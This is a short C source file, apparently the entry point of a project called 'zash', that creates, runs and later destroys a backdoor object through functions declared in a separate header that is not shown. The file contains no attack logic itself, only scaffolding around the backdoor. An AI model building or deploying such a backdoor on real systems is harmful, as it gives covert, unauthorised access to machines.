/**
 * @brief This module use the backdoor.
 * @aouther Z.F
 * @date 19/3/2020
 */

/** Headers ************************************************/
#include <unistd.h>

#include "backdoor/backdoor.h"
#include "zash_status.h"


/** Constants ************************************************/
#define ZASH_TIME_TO_SLEEP (30)


/** Functions ************************************************/
/**
 * @brief Run the backdoor.
 *
 * @return               return value indicating an error may returned.
 *
 */
int main(void)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct BACKDOOR_context *context;

    /* Create a new backdoor */
    status = BACKDOOR_create(&context);
    if (ZASH_STATUS_SUCCESS != status) {
        goto lbl_cleanup;
    }

    /* Run the backdoor */
    status = BACKDOOR_run(context);
    if (ZASH_STATUS_SUCCESS != status) {
        goto lbl_cleanup;
    }

    /* Wait some time */
    (void)sleep(ZASH_TIME_TO_SLEEP);

    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    /* Destroy the backdoor */
    temp_status = BACKDOOR_destroy(context);
    if (ZASH_STATUS_SUCCESS != temp_status) {
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    return status;
}